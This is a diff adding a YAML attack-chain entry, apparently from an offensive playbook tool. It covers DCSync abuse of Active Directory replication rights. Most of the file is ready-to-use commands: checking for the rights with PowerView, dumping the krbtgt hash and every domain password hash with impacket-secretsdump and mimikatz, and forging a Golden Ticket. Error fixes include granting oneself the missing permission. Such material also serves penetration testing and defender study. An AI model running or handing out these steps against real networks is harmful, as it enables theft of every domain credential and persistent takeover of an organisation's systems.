@@ -1,0 +1,73 @@
+chain_id: dcsync_replication_rights
+title: "AD — DCSync via DS-Replication-Get-Changes-All → krbtgt + every domain hash"
+severity: CRITICAL
+tags: [ad, dcsync, mimikatz, impacket, secretsdump, replication, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "dcsync_rights" }
+    - { kind: "ds_replication_get_changes_all" }
+    - { kind: "domain_admin_credentials" }
+
+description: |
+  Any principal that holds `DS-Replication-Get-Changes` AND
+  `DS-Replication-Get-Changes-All` can ask any DC to replicate the
+  password hashes of every domain user — the same RPC real DCs use
+  to sync each other. Domain Admins / Enterprise Admins / specific
+  service accounts (Azure AD Connect's `MSOL_*` is the classic
+  example), and accidentally-granted ACLs from BloodHound's
+  `GetChanges` edge. Lights up the krbtgt hash → Golden Ticket
+  forever-domain-admin.
+
+steps:
+  - id: 1
+    title: "Confirm you have the right (BloodHound or directly)"
+    command: |
+      # In BloodHound:
+      #   MATCH (a)-[:GetChanges|GetChangesAll]->(d:Domain)
+      #   RETURN a.name
+      # Or via PowerView:
+      Get-ObjectAcl -DistinguishedName "DC=DOMAIN,DC=LOCAL" -ResolveGUIDs | \
+        ?{ $_.ObjectAceType -match 'DS-Replication-Get-Changes' }
+
+  - id: 2
+    title: "DCSync krbtgt with impacket"
+    command: |
+      impacket-secretsdump -just-dc-user 'krbtgt' \
+        DOMAIN/USER:'PASS'@DC.DOMAIN
+
+  - id: 3
+    title: "Full domain dump"
+    command: |
+      impacket-secretsdump DOMAIN/USER:'PASS'@DC.DOMAIN
+
+  - id: 4
+    title: "From a Windows foothold — mimikatz"
+    command: |
+      mimikatz "lsadump::dcsync /domain:DOMAIN /user:krbtgt"
+      mimikatz "lsadump::dcsync /domain:DOMAIN /all"
+
+  - id: 5
+    title: "Forge a Golden Ticket on the krbtgt hash"
+    command: |
+      # See chain golden_ticket for the full forging flow.
+      impacket-ticketer -nthash <KRBTGT_NT> \
+        -domain-sid <SID> -domain DOMAIN \
+        -spn '' Administrator
+
+common_errors:
+  - error: "secretsdump: STATUS_DRSUAPI_ERROR (0x20F7)"
+    solution: |
+      Account has GetChanges but not GetChangesAll. Use
+      `-just-dc-user` for a specific user (still works without the
+      `All` right for non-secret attributes). Or escalate by adding
+      yourself the missing ACE if you have GenericAll on the domain.
+  - error: "PowerView ACE check shows nothing"
+    solution: |
+      The right may be inherited from a parent OU or built-in group.
+      Re-run with `-ResolveGUIDs` and `-Audit` flags, and check
+      group memberships transitively.
+
+references:
+  - https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
+  - https://adsecurity.org/?p=1729
